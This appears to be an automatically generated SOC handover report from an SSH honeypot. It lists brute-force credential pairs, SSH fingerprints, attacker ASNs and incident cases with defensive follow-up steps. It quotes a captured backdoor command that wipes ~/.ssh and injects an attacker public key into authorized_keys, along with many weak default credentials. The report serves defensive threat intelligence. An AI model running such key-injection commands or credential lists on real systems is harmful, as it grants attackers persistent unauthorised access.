# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-14 |
| **Generated At** | 2026-07-14T19:26:29Z |
| **Shift Time** | 19:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **158** |
| Confirmed Threats | **144** |
| False Positives Filtered | **14** (8.9%) |
| Unique Attacker IPs | **80** |
| Countries of Origin | **30** |
| High Severity Cases | **82** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **76** |
| Malware Samples Analyzed | **4** HIGH · **32** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **128** |
| Unique Credential Pairs | **53** |
| Unique Usernames | **20** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **100** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 39 |
| `admin` | 28 |
| `345gs5662d34` | 15 |
| `support` | 11 |
| `blank` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `admin` | 8 |
| `00` | 6 |
| `ubuntu` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `admin` | `admin` | 8 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `00` | 6 |
| `root` | `root01` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `maggie` | `185.242.3.195` | 2026-07-14T16:55:36 |
| `root` | `root01` | `92.84.21.186` | 2026-07-14T16:58:00 |
| `root` | `root01` | `211.223.41.90` | 2026-07-14T16:58:09 |
| `ftpuser` | `ftp` | `36.64.33.82` | 2026-07-14T16:59:35 |
| `www` | `password@1234567` | `45.198.224.92` | 2026-07-14T17:01:05 |
| `root` | `root01` | `221.120.42.196` | 2026-07-14T17:01:33 |
| `root` | `root01` | `223.25.108.2` | 2026-07-14T17:01:42 |
| `admin` | `admin` | `43.110.36.163` | 2026-07-14T17:02:06 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-14T17:02:06 |
| `blank` | `qwer1234` | `61.169.54.150` | 2026-07-14T17:02:44 |
| `blank` | `qwer1234` | `61.145.163.164` | 2026-07-14T17:02:57 |
| `blank` | `qwer1234` | `10.0.0.73` | 2026-07-14T17:03:05 |
| `root` | `poiu0987` | `10.0.0.73` | 2026-07-14T17:03:55 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-14T17:03:59 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-14T17:04:01 |
| `frontend` | `frontend123` | `10.0.0.73` | 2026-07-14T17:04:30 |
| `frontend` | `3245gs5662d34` | `10.0.0.73` | 2026-07-14T17:04:36 |
| `root` | `123QWEasdzxc` | `10.0.0.73` | 2026-07-14T17:08:03 |
| `root` | `maggie` | `10.0.0.73` | 2026-07-14T17:09:18 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-14T17:11:32 |
| `gitlabuser` | `gitlabuser` | `10.0.0.73` | 2026-07-14T17:19:08 |
| `gitlabuser` | `3245gs5662d34` | `10.0.0.73` | 2026-07-14T17:19:15 |
| `www` | `password@1234567` | `10.0.0.73` | 2026-07-14T17:20:54 |
| `odoo17` | `P@ssw0rd` | `10.0.0.73` | 2026-07-14T17:21:19 |
| `odoo17` | `3245gs5662d34` | `10.0.0.73` | 2026-07-14T17:21:25 |
| `admin` | `ubuntu` | `119.202.139.244` | 2026-07-14T17:23:35 |
| `admin` | `ubuntu` | `60.166.31.198` | 2026-07-14T17:23:50 |
| `admin` | `00` | `222.92.61.242` | 2026-07-14T17:24:37 |
| `root` | `Password` | `182.79.218.164` | 2026-07-14T17:24:42 |
| `admin` | `00` | `39.164.91.67` | 2026-07-14T17:24:46 |
| `admin` | `ubuntu` | `61.12.86.90` | 2026-07-14T17:27:09 |
| `admin` | `ubuntu` | `156.238.86.2` | 2026-07-14T17:27:24 |
| `admin` | `00` | `122.186.249.6` | 2026-07-14T17:28:06 |
| `admin` | `00` | `220.132.170.64` | 2026-07-14T17:28:15 |
| `root` | `Password` | `113.158.205.225` | 2026-07-14T17:28:16 |
| `root` | `Password` | `65.20.202.4` | 2026-07-14T17:28:24 |
| `admin` | `00` | `10.0.0.73` | 2026-07-14T17:28:29 |
| `root` | `aa888888` | `103.20.122.54` | 2026-07-14T17:35:17 |
| `345gs5662d34` | `345gs5662d34` | `103.20.122.54` | 2026-07-14T17:35:21 |
| `root` | `3245gs5662d34` | `103.20.122.54` | 2026-07-14T17:35:23 |
| `support` | `support` | `176.53.159.196` | 2026-07-14T17:37:21 |
| `root` | `postgres@1234` | `135.181.251.219` | 2026-07-14T17:38:37 |
| `345gs5662d34` | `345gs5662d34` | `135.181.251.219` | 2026-07-14T17:38:39 |
| `root` | `3245gs5662d34` | `135.181.251.219` | 2026-07-14T17:38:40 |
| `support` | `support` | `10.0.0.73` | 2026-07-14T17:38:42 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-14T17:42:46 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-14T17:42:46 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-14T17:42:55 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-14T17:45:12 |
| `root` | `Qwsx000#` | `185.242.3.195` | 2026-07-14T17:46:46 |
| `support` | `password321` | `60.173.105.206` | 2026-07-14T17:48:51 |
| `support` | `password321` | `14.1.64.22` | 2026-07-14T17:49:00 |
| `admin` | `1qaz2wsx` | `185.255.212.178` | 2026-07-14T17:49:45 |
| `admin` | `1qaz2wsx` | `218.29.196.162` | 2026-07-14T17:49:54 |
| `admin` | `a123456789` | `196.0.34.106` | 2026-07-14T17:50:18 |
| `support` | `password321` | `10.0.0.73` | 2026-07-14T17:52:46 |
| `admin` | `a123456789` | `197.251.249.117` | 2026-07-14T17:53:41 |
| `root` | `kAEIBbNEdW` | `10.0.0.73` | 2026-07-14T17:56:03 |
| `admin` | `admin` | `138.68.243.18` | 2026-07-14T17:57:10 |
| `root` | `---fuck_you----` | `107.173.127.185` | 2026-07-14T17:59:36 |
| `root` | `Qwsx000#` | `10.0.0.73` | 2026-07-14T18:00:08 |
| `root` | `qweQWE123` | `10.0.0.73` | 2026-07-14T18:01:08 |
| `root` | `reza123` | `190.5.200.98` | 2026-07-14T18:05:51 |
| `345gs5662d34` | `345gs5662d34` | `190.5.200.98` | 2026-07-14T18:05:53 |
| `root` | `3245gs5662d34` | `190.5.200.98` | 2026-07-14T18:05:54 |
| `admin` | `c1@r0` | `203.92.36.109` | 2026-07-14T18:15:17 |
| `admin` | `c1@r0` | `210.4.68.72` | 2026-07-14T18:15:25 |
| `tunnel` | `tunnel` | `92.84.21.186` | 2026-07-14T18:15:33 |
| `admin` | `admin5` | `70.166.167.48` | 2026-07-14T18:17:31 |
| `admin` | `admin5` | `121.66.124.148` | 2026-07-14T18:17:45 |
| `admin` | `c1@r0` | `10.0.0.73` | 2026-07-14T18:19:07 |
| `tunnel` | `tunnel` | `182.53.55.252` | 2026-07-14T18:19:09 |
| `tunnel` | `tunnel` | `10.0.0.73` | 2026-07-14T18:19:28 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-14T18:23:09 |
| `ubuntu` | `123qweasd` | `10.0.0.73` | 2026-07-14T18:25:15 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-14T18:25:17 |
| `user` | `ubuntu1234567` | `45.198.224.92` | 2026-07-14T18:37:11 |
| `support` | `Support10` | `65.20.250.180` | 2026-07-14T18:39:17 |
| `tomcat` | `t0mc4t` | `185.242.3.195` | 2026-07-14T18:39:35 |
| `test1` | `test1` | `201.63.52.54` | 2026-07-14T18:40:13 |
| `test1` | `test1` | `202.138.229.190` | 2026-07-14T18:40:21 |
| `root` | `andrea` | `107.150.110.217` | 2026-07-14T18:40:35 |
| `345gs5662d34` | `345gs5662d34` | `107.150.110.217` | 2026-07-14T18:40:37 |
| `root` | `3245gs5662d34` | `107.150.110.217` | 2026-07-14T18:40:38 |
| `support` | `Support10` | `118.123.116.93` | 2026-07-14T18:42:53 |
| `support` | `Support10` | `65.20.233.110` | 2026-07-14T18:43:06 |
| `test1` | `test1` | `124.88.174.143` | 2026-07-14T18:43:39 |
| `morgan` | `morgan` | `115.190.126.68` | 2026-07-14T18:44:38 |
| `debian` | `654321` | `10.0.0.73` | 2026-07-14T18:44:41 |
| `root` | `ubuntu` | `220.189.218.126` | 2026-07-14T18:44:47 |
| `gaurav` | `gaurav` | `202.70.78.237` | 2026-07-14T18:45:52 |
| `345gs5662d34` | `345gs5662d34` | `202.70.78.237` | 2026-07-14T18:45:57 |
| `gaurav` | `3245gs5662d34` | `202.70.78.237` | 2026-07-14T18:45:59 |
| `steam` | `1234qwer` | `103.23.135.183` | 2026-07-14T18:48:14 |
| `345gs5662d34` | `345gs5662d34` | `103.23.135.183` | 2026-07-14T18:48:22 |
| `steam` | `3245gs5662d34` | `103.23.135.183` | 2026-07-14T18:48:26 |
| `edwin` | `1234` | `103.134.154.138` | 2026-07-14T18:50:24 |
| `345gs5662d34` | `345gs5662d34` | `103.134.154.138` | 2026-07-14T18:50:28 |
| `edwin` | `3245gs5662d34` | `103.134.154.138` | 2026-07-14T18:50:30 |
| `tomcat` | `t0mc4t` | `10.0.0.73` | 2026-07-14T18:53:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **158** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 36 |
| libssh | 29 |
| Go SSH scanner | 15 |
| Paramiko (Python) | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 36 | 35 |
| `f555226df196...` | Mirai/variant | 21 | 7 |
| `a2de0f306611...` | Mirai/variant | 8 | 1 |
| `16443846184e...` | Generic scanner | 7 | 2 |
| `a704be057881...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 36 | 35 | Mirai/variant |
| `f555226df196...` | libssh | 21 | 7 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 7 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `135.181.251.219`, `202.70.78.237`, `107.150.110.217`, `190.5.200.98`, `103.23.135.183`, `103.20.122.54`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **80** |
| Unique ASNs | **56** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (82)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-aff972342220

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 16:55 |
| **Last Seen** | 2026-07-14 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 16:55:36` | `cowrie.session.connect` |
| `2026-07-14 16:55:36` | `cowrie.client.version` |
| `2026-07-14 16:55:36` | `cowrie.client.kex` |
| `2026-07-14 16:55:36` | `cowrie.login.success` |
| `2026-07-14 16:55:37` | `cowrie.session.params` |
| `2026-07-14 16:55:37` | `cowrie.command.input` |
| `2026-07-14 16:55:37` | `cowrie.log.closed` |
| `2026-07-14 16:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18daa9cfc2f3

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-07-14 16:57 |
| **Last Seen** | 2026-07-14 16:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 16:57:58` | `cowrie.session.connect` |
| `2026-07-14 16:57:59` | `cowrie.client.version` |
| `2026-07-14 16:57:59` | `cowrie.client.kex` |
| `2026-07-14 16:58:00` | `cowrie.login.success` |
| `2026-07-14 16:58:00` | `cowrie.direct-tcpip.request` |
| `2026-07-14 16:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c084f4cda4b

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-07-14 16:58 |
| **Last Seen** | 2026-07-14 16:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 16:58:06` | `cowrie.session.connect` |
| `2026-07-14 16:58:07` | `cowrie.client.version` |
| `2026-07-14 16:58:07` | `cowrie.client.kex` |
| `2026-07-14 16:58:09` | `cowrie.login.success` |
| `2026-07-14 16:58:10` | `cowrie.direct-tcpip.request` |
| `2026-07-14 16:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df7af33b209c

| Field | Detail |
|---|---|
| **Source IP** | `36.64.33[.]82` |
| **First Seen** | 2026-07-14 16:59 |
| **Last Seen** | 2026-07-14 16:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 16:59:29` | `cowrie.session.connect` |
| `2026-07-14 16:59:30` | `cowrie.client.version` |
| `2026-07-14 16:59:31` | `cowrie.client.kex` |
| `2026-07-14 16:59:35` | `cowrie.login.success` |
| `2026-07-14 16:59:36` | `cowrie.direct-tcpip.request` |
| `2026-07-14 16:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.33[.]82` to AbuseIPDB if not already reported
- [ ] Block `36.64.33[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675b57320c3d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]92` |
| **First Seen** | 2026-07-14 17:01 |
| **Last Seen** | 2026-07-14 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:01:05` | `cowrie.session.connect` |
| `2026-07-14 17:01:05` | `cowrie.client.version` |
| `2026-07-14 17:01:05` | `cowrie.client.kex` |
| `2026-07-14 17:01:05` | `cowrie.login.success` |
| `2026-07-14 17:01:06` | `cowrie.session.params` |
| `2026-07-14 17:01:06` | `cowrie.command.input` |
| `2026-07-14 17:01:06` | `cowrie.log.closed` |
| `2026-07-14 17:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7341cc31437f

| Field | Detail |
|---|---|
| **Source IP** | `221.120.42[.]196` |
| **First Seen** | 2026-07-14 17:01 |
| **Last Seen** | 2026-07-14 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:01:30` | `cowrie.session.connect` |
| `2026-07-14 17:01:31` | `cowrie.client.version` |
| `2026-07-14 17:01:31` | `cowrie.client.kex` |
| `2026-07-14 17:01:33` | `cowrie.login.success` |
| `2026-07-14 17:01:34` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.42[.]196` to AbuseIPDB if not already reported
- [ ] Block `221.120.42[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea128410bb7

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-07-14 17:01 |
| **Last Seen** | 2026-07-14 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:01:39` | `cowrie.session.connect` |
| `2026-07-14 17:01:40` | `cowrie.client.version` |
| `2026-07-14 17:01:40` | `cowrie.client.kex` |
| `2026-07-14 17:01:42` | `cowrie.login.success` |
| `2026-07-14 17:01:43` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f6d1b501636

| Field | Detail |
|---|---|
| **Source IP** | `43.110.36[.]163` |
| **First Seen** | 2026-07-14 17:02 |
| **Last Seen** | 2026-07-14 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:02:05` | `cowrie.session.connect` |
| `2026-07-14 17:02:05` | `cowrie.client.version` |
| `2026-07-14 17:02:05` | `cowrie.client.kex` |
| `2026-07-14 17:02:06` | `cowrie.login.success` |
| `2026-07-14 17:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.110.36[.]163` to AbuseIPDB if not already reported
- [ ] Block `43.110.36[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18297d823122

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-14 17:02 |
| **Last Seen** | 2026-07-14 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:02:06` | `cowrie.session.connect` |
| `2026-07-14 17:02:06` | `cowrie.client.version` |
| `2026-07-14 17:02:06` | `cowrie.client.kex` |
| `2026-07-14 17:02:06` | `cowrie.login.success` |
| `2026-07-14 17:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbfff341a1e

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-07-14 17:02 |
| **Last Seen** | 2026-07-14 17:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:02:40` | `cowrie.session.connect` |
| `2026-07-14 17:02:41` | `cowrie.client.version` |
| `2026-07-14 17:02:41` | `cowrie.client.kex` |
| `2026-07-14 17:02:44` | `cowrie.login.success` |
| `2026-07-14 17:02:45` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acae961898d2

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-07-14 17:02 |
| **Last Seen** | 2026-07-14 17:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:02:55` | `cowrie.session.connect` |
| `2026-07-14 17:02:55` | `cowrie.client.version` |
| `2026-07-14 17:02:55` | `cowrie.client.kex` |
| `2026-07-14 17:02:57` | `cowrie.login.success` |
| `2026-07-14 17:02:58` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-562fc3f2c5e4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 17:12 |
| **Last Seen** | 2026-07-14 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:12:22` | `cowrie.session.connect` |
| `2026-07-14 17:12:22` | `cowrie.client.version` |
| `2026-07-14 17:12:22` | `cowrie.client.kex` |
| `2026-07-14 17:12:23` | `cowrie.login.success` |
| `2026-07-14 17:12:24` | `cowrie.session.params` |
| `2026-07-14 17:12:24` | `cowrie.command.input` |
| `2026-07-14 17:12:24` | `cowrie.log.closed` |
| `2026-07-14 17:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0cffa707acd

| Field | Detail |
|---|---|
| **Source IP** | `119.202.139[.]244` |
| **First Seen** | 2026-07-14 17:23 |
| **Last Seen** | 2026-07-14 17:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:23:31` | `cowrie.session.connect` |
| `2026-07-14 17:23:32` | `cowrie.client.version` |
| `2026-07-14 17:23:32` | `cowrie.client.kex` |
| `2026-07-14 17:23:35` | `cowrie.login.success` |
| `2026-07-14 17:23:35` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.202.139[.]244` to AbuseIPDB if not already reported
- [ ] Block `119.202.139[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9272ddcc52a

| Field | Detail |
|---|---|
| **Source IP** | `60.166.31[.]198` |
| **First Seen** | 2026-07-14 17:23 |
| **Last Seen** | 2026-07-14 17:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:23:46` | `cowrie.session.connect` |
| `2026-07-14 17:23:47` | `cowrie.client.version` |
| `2026-07-14 17:23:47` | `cowrie.client.kex` |
| `2026-07-14 17:23:50` | `cowrie.login.success` |
| `2026-07-14 17:23:51` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.31[.]198` to AbuseIPDB if not already reported
- [ ] Block `60.166.31[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4b95b1d3cc

| Field | Detail |
|---|---|
| **Source IP** | `222.92.61[.]242` |
| **First Seen** | 2026-07-14 17:24 |
| **Last Seen** | 2026-07-14 17:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
